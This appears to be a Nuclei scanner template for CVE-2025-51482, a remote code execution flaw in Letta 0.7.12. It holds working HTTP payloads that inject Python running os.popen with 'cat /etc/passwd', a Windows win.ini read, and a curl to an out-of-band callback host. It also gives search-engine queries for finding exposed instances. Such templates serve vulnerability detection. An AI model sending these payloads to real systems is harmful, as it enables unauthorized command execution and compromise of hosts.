id: CVE-2025-51482

info:
  name: Letta 0.7.12 - Remote Code Execution via /v1/tools/run
  author: hnd3884
  severity: high
  description: Letta (letta-ai) version 0.7.12 contains a remote code execution vulnerability in `letta.server.rest_api.routers.v1.tools.run_tool_from_source`. An attacker can send crafted payloads to the `/v1/tools/run` endpoint which bypass intended sandboxing or sanitization and cause execution of arbitrary Python code / system commands. This can lead to full system compromise on exposed instances running vulnerable versions.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-51482
    - https://github.com/advisories/GHSA-2pgv-8585-494w
    - https://github.com/letta-ai/letta/pull/2630
    - https://security.snyk.io/vuln/SNYK-PYTHON-LETTA-11023292
    - https://gecko.security/blog/cve-2025-51482
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2025-51482
    cwe-id: CWE-94
    epss-score: 0.00127
    cpe: cpe:2.3:a:letta:letta:0.7.12:*:*:*:*:*:*:*
  metadata:
    verified: true
    vendor: letta-ai
    product: letta
    framework: python
    shodan-query: http.title:"Letta" OR http.path:"/v1/tools/run"
    fofa-query: body="/v1/tools/run"
    publicwww-query: "/v1/tools/run"
  tags: cve,cve2025,letta,rce,python,code-injection,unsandboxed,remote-code-execution

variables:
  cmd_passwd: "cat /etc/passwd"
  cmd_win_ini: "type C:\\Windows\\win.ini"
  cmd_oob: "curl http://{{rand_base(10)}}.{{interactsh-url}}/"

flow: http(1) || http(2) || http(3)

http:
  - raw:
      - |
        POST /v1/tools/run HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"source_code": "def test():\n    \"\"\"Test function to execute system commands.\"\"\"\n    import os\n    return os.popen('{{cmd_passwd}}').read()", "args": {}, "env_vars": {"PYTHONPATH": "/usr/lib/python3/dist-packages"}, "name": "test"}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - '"tool_return":"root:x:0:0'
        part: body

  - raw:
      - |
        POST /v1/tools/run HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"source_code": "def test():\n    \"\"\"Test function to execute system commands.\"\"\"\n    import os\n    return os.popen('{{cmd_win_ini}}').read()", "args": {}, "env_vars": {"PYTHONPATH": "/usr/lib/python3/dist-packages"}, "name": "test"}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - '"tool_return":".+?[mci extensions]'
        part: body

  - raw:
      - |
        POST /v1/tools/run HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"source_code": "def test():\n    \"\"\"Test function to execute system commands.\"\"\"\n    import os\n    return os.popen('{{cmd_oob}}').read()", "args": {}, "env_vars": {"PYTHONPATH": "/usr/lib/python3/dist-packages"}, "name": "test"}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
